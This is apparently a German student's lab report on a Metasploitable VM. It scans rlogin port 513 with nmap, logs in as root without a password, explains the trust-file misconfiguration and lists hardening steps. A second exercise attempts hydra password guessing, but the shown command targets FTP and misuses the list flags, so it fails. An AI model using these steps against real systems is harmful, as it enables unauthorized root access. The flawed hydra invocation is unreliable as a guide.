# Übung Vulnerability Scanning

**Klasse:** 4 AHITS
**Name:** Martin Haberl
**Fach:** ITSE4 – Übungen
**Datum:** 03.11.2025

---

## 1) Ziel der Übung

Ziel dieser Übung ist es, den Dienst **rlogin** zu untersuchen und die in der Aufgabenstellung genannten Fragestellungen systematisch zu beantworten. Dabei wird auf der Metasploitable-VM überprüft, ob der rlogin-Dienst erreichbar ist, ob ein Root-Login möglich ist, welche Fehlkonfiguration dies erlaubt und wie diese Sicherheitslücke geschlossen werden kann.

---

## 2) Informiere dich über rlogin und mögliche Angriffe / Fehlkonfigurationen

`rlogin` (Remote Login) ist ein veralteter UNIX-Dienst aus der BSD-Familie, der eine Anmeldung auf entfernten Systemen ermöglicht.

Typische Sicherheitsprobleme von rlogin:

* Die Verbindung ist **nicht verschlüsselt** (Klartextübertragung).
* Die Authentifizierung basiert auf **Vertrauen in den Host**, nicht auf sicheren Zugangsdaten.
* Verwendung von Vertrauensdateien wie:

  * `/etc/hosts.equiv`
  * `~/.rhosts`
* Ein Angreifer kann diese Vertrauensmechanismen ausnutzen.

Mögliche Angriffe:

* Passwortloser Login
* IP-Spoofing / Missbrauch von Trusted Hosts
* Direkter Root-Zugriff

---

## 3) Prüfen mit nmap, ob der rlogin-Port bei Metasploitable offen ist

Der rlogin-Dienst verwendet standardmäßig **TCP-Port 513**.

### Scan-Befehl:

```sh
nmap -p 513 192.168.5.51
```

### Ausgabe:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -p 513 192.168.5.51
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 06:16 EST
Nmap scan report for 192.168.5.51
Host is up (0.00048s latency).

PORT    STATE SERVICE
513/tcp open  login
MAC Address: 00:0C:29:26:B9:F5 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
```

### Interpretation:

Der Scan zeigt, dass der rlogin-Dienst aktiv ist und der zugehörige Port 513 offen ist. Damit ist eine Anmeldung über rlogin grundsätzlich möglich.

---

## 4) Nutzung der Sicherheitslücke: Login als root mit rlogin

Da der rlogin-Dienst aktiv ist, wird versucht, sich als **root** anzumelden.

### Befehl:

```sh
rlogin 192.168.5.51 -l root
```

### Ergebnis:

```sh
┌──(kali㉿kali)-[~]
└─$ rlogin 192.168.5.51 -l root
Last login: Mon Dec 15 06:09:54 EST 2025 from :0.0 on pts/0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have new mail.
root@metasploitable:~# 
```

### Interpretation:

Der Login als root funktioniert ohne Passwortabfrage. Dadurch erhält man sofort vollständige Administratorrechte auf dem System.

---

## 5) Welche Fehlkonfiguration ermöglicht diesen Exploit?

Der Exploit wird durch mehrere Fehlkonfigurationen ermöglicht:

* Der veraltete rlogin-Dienst ist aktiviert.
* Root-Logins über rlogin sind erlaubt.
* Die Authentifizierung basiert auf Vertrauensbeziehungen statt auf Passwörtern.
* Vertrauensdateien wie `/etc/hosts.equiv` oder `/root/.rhosts` sind vorhanden oder unsicher konfiguriert.

Diese Konfiguration erlaubt es, sich ohne Authentifizierung als root anzumelden.

---

## 6) Änderung der Konfiguration zur Schließung der Sicherheitslücke

Um die Sicherheitslücke zu schließen, müssen folgende Maßnahmen umgesetzt werden:

* Deaktivieren oder Entfernen des rlogin-Dienstes.
* Löschen oder Leeren der Datei `/etc/hosts.equiv`.
* Entfernen aller `.rhosts`-Dateien.
* Verhindern von Root-Logins über das Netzwerk.
* Verwendung von SSH als sichere Alternative.

Durch diese Änderungen wird ein unautorisierter Root-Zugriff verhindert.

---

## 7) Absicherung und Behebung der Sicherheitslücke

Um die Sicherheitslücke zu schließen, wurden folgende Maßnahmen durchgeführt bzw. empfohlen:

### rlogin deaktivieren

* rlogin-Dienst stoppen und deaktivieren
* r-Services vollständig entfernen

### Vertrauensdateien entfernen

* `/etc/hosts.equiv` löschen oder leeren
* `~/.rhosts` nicht verwenden

### Root-Login verhindern

* Kein direkter Root-Login über das Netzwerk
* Nutzung von `sudo` für administrative Aufgaben

### Sichere Alternative verwenden

* Einsatz von **SSH**
* Verschlüsselte Kommunikation
* Schlüssel- oder Passwort-Authentifizierung

---

# Übung (Online password guessing)

## 1) Ziel der Übung

Ziel dieser Übung ist es, einen **Online Password Guessing Attack** auf die **rlogin-** und **SSH-Ports** der Metasploitable-VM durchzuführen. Dafür wird das in Kali Linux vorinstallierte Tool **hydra** verwendet. Anhand vorgegebener Benutzer- und Passwortlisten sollen erfolgreiche Login-Kombinationen identifiziert werden.

---

## 2) Vorbereitung

Verwendete Dienste:

* **rlogin** (TCP 513)
* **SSH** (TCP 22)

Verwendete Listen:

* Benutzerliste: vorgegebene Liste (msfadmin, user, root, admin, …)
* Passwortliste: vorgegebene Liste (msfadmin, user, toor, password, …)

Zielsystem:

* Metasploitable VM (Laborumgebung)

---

## 3) Ausführung:

Command: 
```sh 
┌──(kali㉿kali)-[~]
└─$ hydra -V -l ~/Desktop/usernames.txt -p ~/Desktop/passwords.txt -u    192.168.5.51 ftp

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-15 06:55:37
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ftp://192.168.5.51:21/
[ATTEMPT] target 192.168.5.51 - login "/home/kali/Desktop/usernames.txt" - pass "/home/kali/Desktop/passwords.txt" - 1 of 1 [child 0] (0/0)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 06:55:39

```
diesmal hat es nicht geklappt, nach absprache wird die Aufgabe Nächste Stunde wiederholt.